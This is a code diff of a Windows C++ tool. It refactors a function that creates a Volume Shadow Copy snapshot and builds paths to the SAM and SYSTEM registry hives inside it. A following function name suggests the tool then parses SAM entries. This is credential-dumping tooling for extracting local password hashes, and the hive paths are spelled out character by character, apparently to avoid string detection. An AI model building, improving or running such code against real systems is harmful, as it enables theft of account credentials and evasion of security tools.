@@ -20,21 +20,53 @@
 #include "include/ntdll.h"
 #include "include/offreg.h"
 
+static HRESULT WaitAndReleaseVssAsync(IVssAsync** vssAsync) {
+	if (vssAsync == NULL || *vssAsync == NULL) {
+		return E_POINTER;
+	}
+
+	HRESULT result = S_OK;
+	HRESULT asyncResult = VSS_S_ASYNC_PENDING;
+
+	while (asyncResult == VSS_S_ASYNC_PENDING) {
+		Sleep(SLEEP_VSS_SYNC);
+		result = (*vssAsync)->QueryStatus(&asyncResult, NULL);
+		if (FAILED(result)) {
+			break;
+		}
+	}
+
+	(*vssAsync)->Release();
+	*vssAsync = NULL;
+
+	if (FAILED(result)) {
+		return result;
+	}
+
+	if (asyncResult == VSS_S_ASYNC_FINISHED) {
+		return S_OK;
+	}
+
+	if (asyncResult == VSS_S_ASYNC_CANCELLED) {
+		return HRESULT_FROM_WIN32(ERROR_CANCELLED);
+	}
+
+	return asyncResult;
+}
+
 BOOL createSS(WCHAR sourcePathFileSAM[MAX_PATH * sizeof(WCHAR)], WCHAR sourcePathFileSYSTEM[MAX_PATH * sizeof(WCHAR)]) {
-	HRESULT result;
+	HRESULT result = E_FAIL;
 	int strResult;
-	BOOL resultRead;
-	BYTE* SAM;
-	BYTE* SYSTEM;
-	DWORD numberBytesRead;
-	DWORD fileSize;
-	HANDLE file;
+	BOOL success = FALSE;
+	BOOL comInitialized = FALSE;
+	BOOL snapshotPropInitialized = FALSE;
 	IVssBackupComponents* backupComponents = NULL;
 	IVssAsync* vssAsync = NULL;
-	HRESULT asyncResult = E_FAIL;
-	VSS_ID* snapshotSetId = NULL;
-	VSS_ID* snapshotId = NULL;
+	VSS_ID snapshotSetId = GUID_NULL;
+	VSS_ID snapshotId = GUID_NULL;
 	VSS_SNAPSHOT_PROP snapshotProp{};
+	WCHAR auxSAM[] = { L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'S',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',L'C',L'o',L'n',L'f',L'i',L'g',L'\\',L'S',L'A',L'M', L'\0' };
+	WCHAR auxSYSTEM[] = { L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'S',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',L'C',L'o',L'n',L'f',L'i',L'g',L'\\',L'S',L'Y',L'S',L'T',L'E',L'M', L'\0' };
 
 	// For now, we presuppose C:
 
@@ -48,209 +80,95 @@ BOOL createSS(WCHAR sourcePathFileSAM[MAX_PATH * sizeof(WCHAR)], WCHAR sourcePat
 	// Init COM
 	result = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 
-	if (result != S_OK) {
-		exit(result);
+	if (FAILED(result)) {
+		goto cleanup;
 	}
+	comInitialized = TRUE;
 
 	result = CreateVssBackupComponents(&backupComponents);
 
-	if (result != S_OK) {
-		exit(result);
+	if (FAILED(result)) {
+		goto cleanup;
 	}
 
 	result = backupComponents->InitializeForBackup();
 
-	if (result != S_OK) {
-		exit(result);
+	if (FAILED(result)) {
+		goto cleanup;
 	}
 
-	result = backupComponents->GatherWriterMetadata(&vssAsync);
+	result = backupComponents->SetContext(VSS_CTX_CLIENT_ACCESSIBLE);
 
-	if (result != S_OK) {
-		exit(result);
+	if (FAILED(result)) {
+		goto cleanup;
 	}
 
-	while (asyncResult != VSS_S_ASYNC_CANCELLED && asyncResult != VSS_S_ASYNC_FINISHED) {
-		Sleep(SLEEP_VSS_SYNC);
-		result = vssAsync->QueryStatus(&asyncResult, NULL);
-		if (result != S_OK) {
-			vssAsync->Release();
-			vssAsync = NULL;
-		}
+	result = backupComponents->StartSnapshotSet(&snapshotSetId);
+
+	if (FAILED(result)) {
+		goto cleanup;
 	}
 
-	if (asyncResult == VSS_S_ASYNC_CANCELLED) {
-		vssAsync->Release();
-		vssAsync = NULL;
+	result = backupComponents->AddToSnapshotSet(volumeName, GUID_NULL, &snapshotId);
+
+	if (FAILED(result)) {
+		goto cleanup;
 	}
-
-	vssAsync->Release();
-	vssAsync = NULL;
-
-	asyncResult = E_FAIL;
-
-	result = backupComponents->SetBackupState(false, false, VSS_BT_FULL, false);
-
-	snapshotSetId = (VSS_ID*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(VSS_ID));
-
-	result = backupComponents->StartSnapshotSet(snapshotSetId);
-
-	// from StartSnapshotSet until backup completion, if we fail, we must call AbortBackup inside bail
-	BOOL shouldAbortBackupOnBail = FALSE;
-
-	snapshotId = (VSS_ID*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(VSS_ID));
-
-	result = backupComponents->AddToSnapshotSet(volumeName, GUID_NULL, snapshotId);
-
-	result = backupComponents->PrepareForBackup(&vssAsync);
-
-	while (asyncResult != VSS_S_ASYNC_CANCELLED && asyncResult != VSS_S_ASYNC_FINISHED) {
-		Sleep(SLEEP_VSS_SYNC);
-		result = vssAsync->QueryStatus(&asyncResult, NULL);
-		if (result != S_OK) {
-			vssAsync->Release();
-			vssAsync = NULL;
-		}
-	}
-
-	if (asyncResult == VSS_S_ASYNC_CANCELLED) {
-		vssAsync->Release();
-		vssAsync = NULL;
-	}
-
-	asyncResult = E_FAIL;
-	vssAsync->Release();
-	vssAsync = NULL;
-
-	// verify all VSS writers are in the correct state
-
-	VerifyWriterStatus(backupComponents, vssAsync, shouldAbortBackupOnBail);
 
 	result = backupComponents->DoSnapshotSet(&vssAsync);
 
-	while (asyncResult != VSS_S_ASYNC_CANCELLED && asyncResult != VSS_S_ASYNC_FINISHED) {
-		Sleep(SLEEP_VSS_SYNC);
-		result = vssAsync->QueryStatus(&asyncResult, NULL);
-		if (result != S_OK) {
-			vssAsync->Release();
-			vssAsync = NULL;
-		}
+	if (FAILED(result)) {
+		goto cleanup;
 	}
 
-	if (asyncResult == VSS_S_ASYNC_CANCELLED) {
-		vssAsync->Release();
-		vssAsync = NULL;
+	result = WaitAndReleaseVssAsync(&vssAsync);
+
+	if (FAILED(result)) {
+		goto cleanup;
 	}
 
-	asyncResult = E_FAIL;
-	vssAsync->Release();
-	vssAsync = NULL;
+	result = backupComponents->GetSnapshotProperties(snapshotId, &snapshotProp);
 
-	// verify all VSS writers are in the correct state
-
-	VerifyWriterStatus(backupComponents, vssAsync, shouldAbortBackupOnBail);
-
-	result = backupComponents->GetSnapshotProperties(*snapshotId, &snapshotProp);
+	if (FAILED(result)) {
+		goto cleanup;
+	}
+	snapshotPropInitialized = TRUE;
 
 	// Perform the copy from SS
 
 	// SAM
-	WCHAR auxSAM[] = { L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'S',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',L'C',L'o',L'n',L'f',L'i',L'g',L'\\',L'S',L'A',L'M', L'\0' };
 	strResult = swprintf(sourcePathFileSAM, MAX_PATH * sizeof(WCHAR), L"%s\\%s", snapshotProp.m_pwszSnapshotDeviceObject, auxSAM);
+	if (strResult < 0) {
+		goto cleanup;
+	}
 	// SYSTEM
-	WCHAR auxSYSTEM[] = { L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'S',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',L'C',L'o',L'n',L'f',L'i',L'g',L'\\',L'S',L'Y',L'S',L'T',L'E',L'M', L'\0' };
 	strResult = swprintf(sourcePathFileSYSTEM, MAX_PATH * sizeof(WCHAR), L"%s\\%s", snapshotProp.m_pwszSnapshotDeviceObject, auxSYSTEM);
-}
-
-void VerifyWriterStatus(IVssBackupComponents* backupComponents, IVssAsync* vssAsync, BOOL shouldAbortBackupOnBail) {
-	HRESULT result = E_FAIL;
-	HRESULT asyncResult = E_FAIL;
-
-	// verify writer status
-	result = backupComponents->GatherWriterStatus(&vssAsync);
-
-	while (asyncResult != VSS_S_ASYNC_CANCELLED && asyncResult != VSS_S_ASYNC_FINISHED) {
-		Sleep(SLEEP_VSS_SYNC);
-		result = vssAsync->QueryStatus(&asyncResult, NULL);
-		if (result != S_OK) {
-			printf("Unable to query vss async status -- %x\n", result);
-			vssAsync->Release();
-			vssAsync = nullptr;
-			bail(result, backupComponents, shouldAbortBackupOnBail);
-		}
+	if (strResult < 0) {
+		goto cleanup;
 	}
 
-	if (asyncResult == VSS_S_ASYNC_CANCELLED) {
-		printf("Operation was cancelled.");
+	success = TRUE;
+
+cleanup:
+	if (vssAsync != NULL) {
 		vssAsync->Release();
-		vssAsync = nullptr;
-		bail(result, backupComponents, shouldAbortBackupOnBail);
+		vssAsync = NULL;
 	}
 
-	// get count of writers
-	UINT writerCount = 0;
-	result = backupComponents->GetWriterStatusCount(&writerCount);
-	if (result != S_OK) {
-		printf("Unable to get count of writers -- %x\n", result);
-		backupComponents->FreeWriterStatus();
-		vssAsync->Release();
-		vssAsync = nullptr;
-		bail(result, backupComponents, shouldAbortBackupOnBail);
+	if (snapshotPropInitialized) {
+		VssFreeSnapshotProperties(&snapshotProp);
 	}
-
-	// check status of writers
-	for (UINT i = 0; i < writerCount; i++) {
-		VSS_ID pidInstance = {};
-		VSS_ID pidWriter = {};
-		BSTR nameOfWriter = nullptr;
-		VSS_WRITER_STATE state = { };
-		HRESULT vssFailure = {};
-		WCHAR writerDebugString[512] = {};
-		result = backupComponents->GetWriterStatus(i, &pidInstance, &pidWriter, &nameOfWriter, &state, &vssFailure);
-		if (result != S_OK) {
-			printf("Unable to get status of VSS writer %i -- %x\n", i, result);
-			SysFreeString(nameOfWriter); //safe even if nameOfWriter == nullptr
-			backupComponents->FreeWriterStatus();
-			vssAsync->Release();
-			vssAsync = nullptr;
-			bail(result, backupComponents, shouldAbortBackupOnBail);
-		}
-
-		if (vssFailure == 0) {
-			// this writer is happy
-			SysFreeString(nameOfWriter);
-			continue;
-		}
-
-		SysFreeString(nameOfWriter);
-		backupComponents->FreeWriterStatus();
-		vssAsync->Release();
-		vssAsync = nullptr;
-		bail(result, backupComponents, shouldAbortBackupOnBail);
-	}
-
-	backupComponents->FreeWriterStatus();
-}
-
-void bail(HRESULT exitCode, IVssBackupComponents* backupComponents, BOOL shouldAbortBackupOnBail) {
-	//FreeSourceStructures();
 
 	if (backupComponents != NULL) {
-		if (shouldAbortBackupOnBail) {
-			HRESULT abortResult = backupComponents->AbortBackup();
-			if (abortResult != S_OK) {
-				wprintf(L"Failed to abort the backup with error 0x%x\n", abortResult);
-			}
-		}
-
-		// free writer metadata
-		backupComponents->FreeWriterMetadata();
-
 		backupComponents->Release();
-		backupComponents = nullptr;
+		backupComponents = NULL;
 	}
 
-	exit(exitCode);
+	if (comInitialized) {
+		CoUninitialize();
+	}
+
+	return success;
 }
 
 void getSAMfromRegf(PSAM samRegEntries[], PULONG size, WCHAR SAMPath[MAX_PATH], WCHAR SYSTEMPath[MAX_PATH]) {
